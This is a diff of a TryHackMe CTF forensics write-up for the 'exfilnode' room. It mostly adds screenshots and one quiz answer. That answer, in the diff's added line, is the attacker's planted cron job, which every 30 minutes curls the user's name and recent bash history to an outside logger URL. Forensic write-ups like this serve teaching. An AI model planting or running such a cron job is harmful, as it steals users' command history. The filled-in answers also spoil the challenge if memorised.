@@ -9,6 +9,10 @@ It is classified as a medium-level CTF.<br>
 It is a premium room: for subscribers only.<br>
 Can be accessed clicking  <a href="https://tryhackme.com/room/exfilnode">here</a>.</p>
 
+
+![image](https://github.com/user-attachments/assets/6aedc273-fadf-4bf4-a04b-45369d4354cc)
+
+
 <br>
 <br>
 
@@ -219,7 +223,7 @@ To use Autopsy, open a terminal and navigate to <code>/home/ubuntu/autopsy/autop
 
 
 > 1.14. <em>Which cronjob did the external entity set up inside Liam’s machine?</em><br><a id='1.14'></a>
->> <strong><code>__</code></strong><br>
+>> <strong><code>*/30 * * * * curl -s -X POST -d "$(whoami):$(tail -n 5 ~/.bash_history)" http://192.168.1.23/logger.php</code></strong><br>
 <p></p>
 
 <br>
@@ -228,17 +232,16 @@ To use Autopsy, open a terminal and navigate to <code>/home/ubuntu/autopsy/autop
 
 <br>
 
-![image](https://github.com/user-attachments/assets/3d10e5c6-9418-483d-81fa-8606a1157ea0)
+![image](https://github.com/user-attachments/assets/4abd4c49-9721-4ac4-89b0-fa5bb6ef22c3)
 
-
-
+<br>
 <br>
 
 <h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>
 <br>
 <p align="center">
-<img width="900px" src=""><br>
-<img width="900px" src=""></p>
+<img width="900px" src="https://github.com/user-attachments/assets/7b21f7c3-aa22-4f32-9bfc-c74baf3bc344"><br>
+<img width="900px" src="https://github.com/user-attachments/assets/8bab03cb-435f-46ac-b985-99613465420f"></p>
 
 <br>
 
